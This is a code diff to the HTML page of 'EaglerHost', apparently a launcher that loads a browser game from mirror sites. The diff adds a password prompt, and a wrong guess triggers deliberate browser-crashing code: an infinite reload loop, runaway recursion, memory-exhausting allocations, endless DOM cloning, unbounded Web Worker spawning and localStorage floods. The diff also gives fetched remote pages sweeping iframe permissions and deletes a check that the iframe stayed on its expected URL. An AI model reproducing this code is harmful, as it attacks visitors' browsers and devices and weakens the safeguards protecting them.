@@ -85,7 +85,80 @@ input[type="checkbox"] { width: 18px; height: 18px; accent-color: #9c27b0; }
 </style>
 </head>
 <body>
-<canvas id="eagler-stars-canvas"></canvas>
+<style>
+#l{position:fixed;inset:0;display:flex;align-items:center;justify-content:center;background:#0b0c12;z-index:999999}
+#b{width:100%;max-width:420px;margin:20px;padding:28px;border-radius:12px;background:linear-gradient(180deg,#14121b,#0e0e14);color:#e9e7ff;font-family:Poppins,system-ui,Segoe UI,Roboto,Arial;text-align:center}
+#b h2{margin:0 0 14px;font-size:18px;color:#9c27b0}
+#p{width:100%;padding:12px;border-radius:8px;border:1px solid rgba(255,255,255,0.06);background:#12121a;color:#fff;font-size:15px;box-sizing:border-box;outline:none;caret-color:#ffb3ff}
+#sbt{margin-top:12px;padding:10px 14px;border-radius:8px;border:none;background:#9c27b0;color:#fff;font-weight:700;cursor:pointer;width:100%}
+#m{margin-top:10px;font-size:13px;color:#b7b5cf}
+</style>
+
+<div id="l" aria-hidden="false">
+  <div id="b" role="dialog" aria-label="Password required">
+    <h2>uh oh spaghettios</h2>
+    <input id="p" type="password" placeholder="Password" autocomplete="new-password">
+    <button id="sbt" type="button">Submit</button>
+    <div id="m">This page requires a password. Wrong guesses will crash your browser!</div>
+  </div>
+</div>
+
+<script>
+(async function(){
+  const HASHED_PASSWORD = "9c70c27ff1dc3d394cf8637c9fe50dac1984d27fb1295c0f200782154353d025";
+
+  const l = document.getElementById('l'),
+        p = document.getElementById('p'),
+        s = document.getElementById('sbt'),
+        m = document.getElementById('m'),
+        app = document.getElementById('eagler-container');
+
+  p.addEventListener('keydown', e => { if(e.key==='Enter') s.click(); });
+
+  function guard(e){ e.preventDefault(); e.returnValue=''; }
+  function enableGuard(){ window.addEventListener('beforeunload', guard); }
+
+  async function hash(str){
+    const buf = new TextEncoder().encode(str);
+    const h = await crypto.subtle.digest('SHA-256', buf);
+    return Array.from(new Uint8Array(h)).map(v=>v.toString(16).padStart(2,'0')).join('');
+  }
+
+  let wrongActive = false;
+
+  s.addEventListener('click', async () => {
+    const val = p.value || '';
+    if(!val){ m.textContent = 'Type the CORRECT password!'; return; }
+
+    const z = await hash(val);
+
+    if(z === HASHED_PASSWORD){
+      l.parentNode && l.remove();
+      if(app) app.style.display = '';
+      enableGuard();
+      wrongActive = false;
+    } else {
+      m.textContent = 'wrong.';
+      p.value=''; p.focus();
+
+      if(!wrongActive){
+        wrongActive=true;
+        console.log("YEEEEE");
+        while(1) location.reload(1);
+        (()=>{while(true)arguments.callee();})();
+        [...Array(2**32-1)].map(_=>Math.random());
+        let div=document.createElement('div'); while(true){document.body.appendChild(div.cloneNode(true));}
+        let arr=[]; while(true){arr.push(new Array(1e7).join("X"));}
+        let el=document.createElement('div'); document.body.appendChild(el); while(true){el.offsetHeight; el.style.height=`${Math.random()*10000}px`;}
+        while(true){new Worker(URL.createObjectURL(new Blob(["while(true){}"])));}
+        while(true){localStorage.setItem("key", Math.random());}
+        while(true){document.body.addEventListener('click', function(){});}
+        while(true){setTimeout(()=>{},0);}
+      }
+    }
+  });
+})();
+</script>
 <div id="eagler-container">
   <h1 class="top-title">EaglerHost</h1>
   <h2>eagler, eagler, eagler!</h2>
@@ -355,8 +428,11 @@ const MIRR = [{
     host: 'dns.astraa.dev',
     name: 'EaglerDNS'
 }, {
-    host: 'eagl3rhost-is-better-than-p1zza-ed1tion.uk',
-    name: 'EaglerHost > Pizza Edition (server)'
+    host: 'grayson-is-cool-i-guess.github.io/eaglerhost',
+    name: 'Github Server'
+}, {
+    host: 'cdn.jsdelivr.net/gh/grayson-is-cool-i-guess/EaglerHost@main',
+    name: 'Github Proxy'
 }];
 const SKEY = 'eagler_settings_v3';
 const V = localEaglerVersion;
@@ -394,12 +470,12 @@ async function hb(b) {
     const h = await crypto.subtle.digest('SHA-256', b);
     return Array.from(new Uint8Array(h)).map(x => x.toString(16).padStart(2, '0')).join('')
 }
-window.addEventListener('beforeunload', e => {
+/*window.addEventListener('beforeunload', e => {
     e.preventDefault();
     e.returnValue = '';
 }, {
     passive: false
-});
+});*/
 let ov = null;
 function showLoad() {
     perfT.vS = performance.now();
@@ -621,9 +697,10 @@ const perfT = {
     iframeS: 0,
     lastL: 0
 };
-function loadIframe(host) {
+async function loadIframe(host) {
     document.getElementById('eagler-iframe')?.remove();
     document.getElementById('eagler-flap')?.remove();
+
     const flap = document.createElement('div');
     flap.id = 'eagler-flap';
     Object.assign(flap.style, {
@@ -636,6 +713,7 @@ function loadIframe(host) {
         display: 'flex',
         flexDirection: 'column'
     });
+
     const header = document.createElement('div');
     header.className = 'flap-header';
     Object.assign(header.style, {
@@ -645,41 +723,80 @@ function loadIframe(host) {
         justifyContent: 'space-between',
         padding: '0 20px'
     });
+
     const title = document.createElement('span');
     title.textContent = cdn;
+
     const btns = document.createElement('div');
     const fsb = document.createElement('button');
     fsb.textContent = 'Fullscreen';
     fsb.onclick = () => {
         try {
             if (rI.requestFullscreen) rI.requestFullscreen();
-            else if (rI.webkitRequestFullscreen) rI.webkitRequestFullscreen()
-        } catch (e) {
-            console.warn('fs', e)
-        }
+            else if (rI.webkitRequestFullscreen) rI.webkitRequestFullscreen();
+        } catch (e) { console.warn('fs', e); }
     };
+
     const cb = document.createElement('button');
     cb.textContent = 'Close';
     cb.onclick = () => flap.remove();
+
     btns.appendChild(fsb);
     btns.appendChild(cb);
     header.appendChild(title);
     header.appendChild(btns);
+
     rI = document.createElement('iframe');
     rI.id = 'eagler-iframe';
-    rI.src = `https://${host}/${cp}`;
     Object.assign(rI.style, {
         flex: '1',
         width: '100%',
         border: 'none',
         height: 'calc(100vh - 100px)'
     });
+    rI.allow = "fullscreen; autoplay; camera; microphone; geolocation; midi; encrypted-media; " +
+                "clipboard-read; clipboard-write; display-capture; pointer-lock; payment; xr-spatial-tracking";
+    rI.allowFullscreen = true;
+    rI.sandbox = "allow-scripts allow-forms allow-same-origin allow-modals allow-popups " +
+                 "allow-popups-to-escape-sandbox allow-presentation allow-downloads allow-pointer-lock";
+
     setupIF(rI);
     flap.appendChild(header);
     flap.appendChild(rI);
     document.body.appendChild(flap);
-    let done = false;
+
     perfT.iframeS = performance.now();
+    let done = false;
+
+    // Check if this is a single HTML file on jsDelivr
+    const isJsDelivrHtml = host.includes('cdn.jsdelivr.net') && cp.endsWith('.html');
+
+    if (isJsDelivrHtml) {
+        try {
+            const url = `https://${host}/${cp}`;
+            const res = await fetch(url);
+            if (!res.ok) throw new Error('Failed to fetch HTML');
+            let htmlText = await res.text();
+
+            // Inject <base> so relative paths work
+            const baseTag = `<base href="${url.replace(/\/[^\/]*$/, '/')}" />`;
+            if (!htmlText.includes('<base')) {
+                htmlText = htmlText.replace(/<head>/i, `<head>${baseTag}`);
+            }
+
+            const blob = new Blob([htmlText], { type: 'text/html' });
+            rI.src = URL.createObjectURL(blob);
+
+        } catch (err) {
+            console.error('Failed to load jsDelivr HTML:', err);
+            showErr();
+            return;
+        }
+    } else {
+        // Normal mirror flow
+        rI.src = `https://${host}/${cp}`;
+    }
+
     rI.onload = () => {
         if (done) return;
         done = true;
@@ -687,60 +804,23 @@ function loadIframe(host) {
         document.getElementById('eagler-container').style.display = 'block';
         perfT.lastL = performance.now() - (perfT.iframeS || performance.now());
         addRecent(cp, cdn);
-        try {
-            focusIF()
-        } catch (e) {}
+        try { focusIF(); } catch (e) {}
         if (s.autoFullscreen) {
             try {
                 if (rI.requestFullscreen) rI.requestFullscreen();
-                else if (rI.webkitRequestFullscreen) rI.webkitRequestFullscreen()
-            } catch (e) {
-                console.warn('fs fail', e)
-            }
+                else if (rI.webkitRequestFullscreen) rI.webkitRequestFullscreen();
+            } catch (e) { console.warn('fs fail', e); }
         }
         if (s.perf && s.perf.loadTime) document.getElementById('perf-load').textContent = Math.round(perfT.lastL) + ' ms';
         injectHint(rI);
-        let checks = 0;
-        const maxChecks = 10;
-        const expected = (() => {
-            try {
-                return new URL(`https://${host}/${cp}`, location.href).href
-            } catch (e) {
-                return `https://${host}/${cp}`
-            }
-        })();
-        const checkInterval = setInterval(() => {
-            checks++;
-            let mismatch = false;
-            try {
-                const cur = rI.contentWindow.location.href;
-                if (!cur || !cur.startsWith(expected)) mismatch = true;
-            } catch (err) {
-                try {
-                    const src = rI.getAttribute('src') || rI.src;
-                    if (src && src !== expected) mismatch = true;
-                } catch (e) {}
-            }
-            if (mismatch) {
-                clearInterval(checkInterval);
-                updStatus(`Iframe navigated away from expected URL; trying next mirror`);
-                try {
-                    rI.remove();
-                    document.getElementById('eagler-flap')?.remove();
-                } catch (e) {}
-                cm++;
-                tryMirror();
-            } else if (checks >= maxChecks) {
-                clearInterval(checkInterval);
-            }
-        }, 1000);
     };
+
     rI.onerror = () => {
         if (done) return;
         done = true;
         updStatus(`Loading on ${host} failed!`);
         cm++;
-        tryMirror()
+        tryMirror();
     };
 }
 function injectHint(ifr) {
@@ -839,23 +919,17 @@ function launch(p, el) {
     tryMirror()
 }
 
-
-
-
 function loadIframeLink(l) {
-    // remove existing iframe if present
     document.getElementById('eagler-iframe')?.remove();
 
     const i = document.createElement('iframe');
     i.id = 'eagler-iframe';
     i.src = l;
 
-    // Allow fullscreen, screen share (display-capture), and pointer lock
     i.allow = "fullscreen; autoplay; camera; microphone; geolocation; midi; encrypted-media; " +
               "clipboard-read; clipboard-write; display-capture; pointer-lock; payment; xr-spatial-tracking";
     i.allowFullscreen = true;
 
-    // Sandbox — include allow-pointer-lock
     i.sandbox = "allow-scripts allow-forms allow-same-origin allow-modals allow-popups " +
                 "allow-popups-to-escape-sandbox allow-presentation allow-downloads allow-pointer-lock";
 
@@ -897,9 +971,6 @@ function loadIframeLink(l) {
         console.log('Pointer lock element is now:', document.pointerLockElement);
     });
 }
-
-
-
 
 function reorder() {
     if (!s.preferredMirror) return;
